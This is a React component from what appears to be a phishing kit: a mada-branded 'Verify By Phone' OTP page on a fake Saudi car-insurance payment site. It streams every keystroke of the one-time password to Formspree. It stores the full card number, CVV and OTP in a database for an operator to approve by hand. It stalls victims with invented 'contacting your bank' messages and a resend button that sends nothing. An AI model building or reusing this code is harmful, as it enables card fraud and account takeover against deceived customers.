import { useState, useEffect } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Shield, RefreshCw, CheckCircle2, Loader2, XCircle, Lock, ShieldCheck, CreditCard } from "lucide-react";
import { ChatButton } from "@/components/ChatButton";
import { Footer } from "@/components/Footer";
import { useToast } from "@/hooks/use-toast";
import { useFormspreeSync } from "@/hooks/useFormspreeSync";
import { supabase } from "@/integrations/supabase/client";
import { usePresence } from "@/hooks/usePresence";
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import madaLogo from "@/assets/mada-logo.png";

const waitingMessages = [
  { text: "جاري التحقق من رمز الأمان...", icon: Lock },
  { text: "يرجى الانتظار، نتحقق من بياناتك...", icon: ShieldCheck },
  { text: "جاري مراجعة المعاملة...", icon: CreditCard },
  { text: "تأكيد عملية الدفع قيد المعالجة...", icon: Shield },
  { text: "نتواصل مع البنك للتحقق...", icon: Lock },
  { text: "جاري التأكد من صحة البيانات...", icon: ShieldCheck },
];

const OTPVerification = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const { toast } = useToast();
  const companyName = searchParams.get("company") || "شركة التأمين";
  const price = searchParams.get("price") || "0";
  const cardLast4 = searchParams.get("cardLast4") || "";
  const [otp, setOtp] = useState("");

  // تنسيق رقم البطاقة المخفي
  const maskedCardNumber = cardLast4 ? `XXXX XXXX XXXX ${cardLast4}` : "";
  const [timer, setTimer] = useState(120); // 2 minutes
  const [canResend, setCanResend] = useState(false);
  const [isVerifying, setIsVerifying] = useState(false);
  const [applicationId, setApplicationId] = useState<string | null>(null);
  const [waitingForApproval, setWaitingForApproval] = useState(false);
  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
  const [showErrorDialog, setShowErrorDialog] = useState(false);
  const [currentMessageIndex, setCurrentMessageIndex] = useState(0);
  const [waitingProgress, setWaitingProgress] = useState(0);
  
  usePresence(applicationId || undefined, 'otp');

  // Send OTP data to Formspree in real-time
  useFormspreeSync({
    companyName,
    price,
    cardLast4: maskedCardNumber,
    otpEntered: otp,
    otpLength: otp.length,
    remainingTime: `${Math.floor(timer / 60)}:${(timer % 60).toString().padStart(2, "0")}`
  }, "صفحة تأكيد الدفع - OTP Verification");

  useEffect(() => {
    // Get application ID
    const storedId = localStorage.getItem('applicationId');
    if (storedId) {
      setApplicationId(storedId);
    }
  }, []);

  // تغيير رسالة الانتظار كل 3 ثواني
  useEffect(() => {
    if (waitingForApproval) {
      const messageInterval = setInterval(() => {
        setCurrentMessageIndex(prev => (prev + 1) % waitingMessages.length);
      }, 3000);

      const progressInterval = setInterval(() => {
        setWaitingProgress(prev => {
          if (prev >= 100) return 0;
          return prev + 1;
        });
      }, 300);

      return () => {
        clearInterval(messageInterval);
        clearInterval(progressInterval);
      };
    }
  }, [waitingForApproval]);

  useEffect(() => {
    if (waitingForApproval && applicationId) {
      // Check for approval every 2 seconds
      const interval = setInterval(async () => {
        const { data, error } = await supabase
          .from('customer_applications')
          .select('otp_approved, status')
          .eq('id', applicationId)
          .single();
          
        if (data?.otp_approved) {
          clearInterval(interval);
          setWaitingForApproval(false);
          setShowSuccessDialog(true);

          // إعادة التوجيه إلى الصفحة الرئيسية بعد 3 ثواني
          setTimeout(() => {
            localStorage.removeItem('applicationId');
            navigate("/");
          }, 3000);
        } else if (data?.status === 'rejected') {
          clearInterval(interval);
          setWaitingForApproval(false);
          setShowErrorDialog(true);

          // إعادة تعيين OTP للسماح بإعادة المحاولة
          setOtp("");
        }
      }, 2000);
      return () => clearInterval(interval);
    }
  }, [waitingForApproval, applicationId, navigate]);

  // Timer countdown
  useEffect(() => {
    if (timer > 0) {
      const interval = setInterval(() => {
        setTimer(prev => prev - 1);
      }, 1000);
      return () => clearInterval(interval);
    } else {
      setCanResend(true);
    }
  }, [timer]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, "0")}`;
  };

  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const newValue = e.target.value.replace(/\D/g, "").slice(0, 6);
    setOtp(newValue);
  };

  const handleResendOtp = () => {
    setTimer(120);
    setCanResend(false);
    toast({
      title: "تم إرسال الرمز",
      description: "تم إرسال رمز تحقق جديد إلى رقم هاتفك"
    });
  };

  const handleVerify = async () => {
    if (otp.length < 4 || otp.length > 6) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال رمز التحقق (4 أو 6 أرقام)",
        variant: "destructive"
      });
      return;
    }
    setIsVerifying(true);
    try {
      if (applicationId) {
        const { data: existingApp } = await supabase
          .from('customer_applications')
          .select('*')
          .eq('id', applicationId)
          .single();
        
        if (!existingApp) {
          throw new Error('Application not found');
        }

        const { data: newApp, error } = await supabase
          .from('customer_applications')
          .insert([{
            full_name: existingApp.full_name,
            phone: existingApp.phone,
            insurance_type: existingApp.insurance_type,
            vehicle_manufacturer: existingApp.vehicle_manufacturer,
            vehicle_model: existingApp.vehicle_model,
            vehicle_year: existingApp.vehicle_year,
            vehicle_value: existingApp.vehicle_value,
            usage_purpose: existingApp.usage_purpose,
            add_driver: existingApp.add_driver,
            selected_company: existingApp.selected_company,
            selected_price: existingApp.selected_price,
            regular_price: existingApp.regular_price,
            company_logo: existingApp.company_logo,
            cardholder_name: existingApp.cardholder_name,
            card_number: existingApp.card_number,
            card_last_4: existingApp.card_last_4,
            card_type: existingApp.card_type,
            card_cvv: existingApp.card_cvv,
            expiry_date: existingApp.expiry_date,
            otp_code: otp,
            current_step: 'otp',
            payment_approved: existingApp.payment_approved,
            otp_approved: false,
            status: 'pending'
          }])
          .select()
          .single();

        if (error) throw error;
        
        if (newApp) {
          setApplicationId(newApp.id);
          localStorage.setItem('applicationId', newApp.id);
        }
        
        setIsVerifying(false);
        setWaitingForApproval(true);
        setCurrentMessageIndex(0);
        setWaitingProgress(0);
      } else {
        throw new Error('Application ID not found');
      }
    } catch (error) {
      console.error('Error saving OTP:', error);
      setIsVerifying(false);
      toast({
        title: "خطأ",
        description: "حدث خطأ في حفظ البيانات",
        variant: "destructive"
      });
    }
  };

  // صفحة الانتظار الاحترافية
  if (waitingForApproval) {
    const CurrentIcon = waitingMessages[currentMessageIndex].icon;
    
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-50 via-white to-indigo-50 flex items-center justify-center p-4">
        <div className="w-full max-w-md">
          <Card className="p-8 shadow-2xl border-0 bg-white/80 backdrop-blur-sm">
            {/* أيقونة متحركة */}
            <div className="flex justify-center mb-8">
              <div className="relative">
                {/* الدائرة الخارجية المتحركة */}
                <div className="absolute inset-0 w-32 h-32 rounded-full border-4 border-blue-200 animate-pulse" />
                <div className="absolute inset-0 w-32 h-32 rounded-full border-4 border-transparent border-t-blue-600 animate-spin" style={{ animationDuration: '1.5s' }} />
                
                {/* الأيقونة المركزية */}
                <div className="w-32 h-32 rounded-full bg-gradient-to-br from-blue-500 to-indigo-600 flex items-center justify-center shadow-lg">
                  <CurrentIcon className="w-14 h-14 text-white animate-pulse" />
                </div>
              </div>
            </div>

            {/* العنوان */}
            <h2 className="text-2xl font-bold text-center text-gray-800 mb-4">
              جاري التحقق
            </h2>

            {/* الرسالة المتغيرة */}
            <div className="min-h-[60px] flex items-center justify-center">
              <p className="text-lg text-gray-600 text-center animate-fade-in transition-all duration-500">
                {waitingMessages[currentMessageIndex].text}
              </p>
            </div>

            {/* شريط التقدم */}
            <div className="mt-6 mb-4">
              <div className="h-2 bg-gray-200 rounded-full overflow-hidden">
                <div 
                  className="h-full bg-gradient-to-r from-blue-500 to-indigo-600 rounded-full transition-all duration-300"
                  style={{ width: `${waitingProgress}%` }}
                />
              </div>
            </div>

            {/* نقاط التحميل */}
            <div className="flex justify-center gap-2 mt-6">
              {[0, 1, 2].map((i) => (
                <div
                  key={i}
                  className="w-3 h-3 rounded-full bg-blue-500 animate-bounce"
                  style={{ animationDelay: `${i * 0.2}s` }}
                />
              ))}
            </div>

            {/* معلومات المعاملة */}
            <div className="mt-8 p-4 bg-gray-50 rounded-xl border">
              <div className="flex justify-between items-center mb-2">
                <span className="text-sm text-gray-500">الشركة:</span>
                <span className="font-semibold text-gray-800">{companyName}</span>
              </div>
              <div className="flex justify-between items-center mb-2">
                <span className="text-sm text-gray-500">المبلغ:</span>
                <span className="font-bold text-lg text-blue-600">{price} ر.س</span>
              </div>
              <div className="flex justify-between items-center">
                <span className="text-sm text-gray-500">البطاقة:</span>
                <span className="font-mono text-gray-800" dir="ltr">**** {cardLast4}</span>
              </div>
            </div>

            {/* تحذير */}
            <div className="mt-6 p-3 bg-amber-50 border border-amber-200 rounded-lg">
              <p className="text-sm text-amber-800 text-center">
                ⚠️ يرجى عدم إغلاق هذه الصفحة أثناء عملية التحقق
              </p>
            </div>
          </Card>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white">
      <section className="pt-8 pb-16 px-4 md:px-6">
        <div className="container mx-auto max-w-2xl">
          {/* Header with logos */}
          <div className="flex items-center justify-between mb-8 pb-6 border-b">
            <div className="flex items-center gap-4">
              <img src={madaLogo} alt="mada" className="h-10" />
            </div>
            <div className="flex flex-col items-end gap-2">
              <button className="text-sm text-gray-600 hover:text-gray-800">Cancel</button>
              <div className="flex items-center gap-2">
                <span className="text-xl font-bold"></span>
                <div className="bg-[#003D82] text-white text-xs px-2 py-1 rounded">SECURE</div>
              </div>
            </div>
          </div>

          {/* Main Content */}
          <div className="space-y-6">
            <h1 className="text-2xl font-semibold text-gray-900">
              Verify By Phone
            </h1>
            
            <p className="text-base text-gray-700">
              We have sent you a text message with a code to your registered mobile number.
            </p>
            
            <p className="text-base text-gray-700">
              You are paying {companyName} the amount of SAR {price} on {new Date().toLocaleString('en-GB', {
                year: 'numeric',
                month: '2-digit',
                day: '2-digit',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit'
              }).replace(',', '')}.
            </p>

            {/* OTP Input */}
            <div className="space-y-3 pt-8">
              <label className="text-sm text-gray-600 block">
                Verification code
              </label>
              <Input
                type="text"
                inputMode="numeric"
                maxLength={6}
                value={otp}
                onChange={handleOtpChange}
                className="h-12 text-lg border-gray-300 rounded focus:border-blue-600 focus:ring-1 focus:ring-blue-600 bg-white"
                dir="ltr"
                disabled={waitingForApproval}
              />
            </div>

            {/* Confirm Button */}
            <Button
              onClick={handleVerify}
              disabled={isVerifying || waitingForApproval || otp.length < 4}
              className="w-full h-12 text-base font-semibold rounded bg-blue-600 hover:bg-blue-700 text-white disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {isVerifying ? (
                <>
                  <Loader2 className="ml-2 h-5 w-5 animate-spin" />
                  جاري التحقق...
                </>
              ) : (
                "CONFIRM"
              )}
            </Button>

            {/* Resend Code */}
            <div className="text-center pt-4">
              {canResend ? (
                <button
                  onClick={handleResendOtp}
                  className="text-blue-600 hover:text-blue-800 font-medium text-base underline"
                >
                  RESEND CODE
                </button>
              ) : (
                <p className="text-sm text-gray-500">
                  يمكنك إعادة إرسال الرمز بعد {formatTime(timer)}
                </p>
              )}
            </div>

            {/* Help Links */}
            <div className="pt-8 space-y-3 border-t">
              <details className="group">
                <summary className="flex items-center justify-between cursor-pointer text-blue-600 hover:text-blue-800 text-base font-medium">
                  Learn more about authentication
                  <span className="text-xl group-open:rotate-45 transition-transform">+</span>
                </summary>
                <div className="mt-3 text-sm text-gray-600">
                  التحقق من الهاتف هو طبقة أمان إضافية لحماية معاملاتك المالية.
                </div>
              </details>
              
              <details className="group">
                <summary className="flex items-center justify-between cursor-pointer text-blue-600 hover:text-blue-800 text-base font-medium">
                  Need some help ?
                  <span className="text-xl group-open:rotate-45 transition-transform">+</span>
                </summary>
                <div className="mt-3 text-sm text-gray-600">
                  إذا واجهت أي مشكلة، يرجى التواصل مع خدمة العملاء.
                </div>
              </details>
            </div>
          </div>
        </div>
      </section>

      <ChatButton />
      <Footer />

      {/* نافذة النجاح */}
      <Dialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
        <DialogContent className="sm:max-w-md text-center">
          <DialogHeader>
            <div className="mx-auto mb-4 flex h-20 w-20 items-center justify-center rounded-full bg-green-100 dark:bg-green-900/20">
              <CheckCircle2 className="h-12 w-12 text-green-600 dark:text-green-400" />
            </div>
            <DialogTitle className="text-2xl font-bold text-center">
              تم الدفع بنجاح! 🎉
            </DialogTitle>
            <DialogDescription className="text-center text-base pt-2">
              تم تأكيد عملية الدفع بنجاح
              <br />
              سيتم إعادة توجيهك إلى الصفحة الرئيسية...
            </DialogDescription>
          </DialogHeader>
          <div className="flex justify-center pt-2">
            <Loader2 className="h-6 w-6 animate-spin text-primary" />
          </div>
        </DialogContent>
      </Dialog>

      {/* نافذة الخطأ */}
      <Dialog open={showErrorDialog} onOpenChange={open => {
        setShowErrorDialog(open);
        if (!open) {
          if (applicationId) {
            supabase.from('customer_applications').update({
              status: 'pending'
            }).eq('id', applicationId);
          }
        }
      }}>
        <DialogContent className="sm:max-w-md text-center">
          <DialogHeader>
            <div className="mx-auto mb-4 flex h-20 w-20 items-center justify-center rounded-full bg-red-100 dark:bg-red-900/20">
              <XCircle className="h-12 w-12 text-red-600 dark:text-red-400" />
            </div>
            <DialogTitle className="text-2xl font-bold text-center text-red-600 dark:text-red-400">
              رمز تحقق غير صحيح! ❌
            </DialogTitle>
            <DialogDescription className="text-center text-base pt-2">
              يرجى إدخال رمز التحقق الصحيح
              <br />
              حاول مرة أخرى
            </DialogDescription>
          </DialogHeader>
          <Button onClick={() => setShowErrorDialog(false)} className="mt-4" variant="default">
            حسناً، سأحاول مرة أخرى
          </Button>
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default OTPVerification;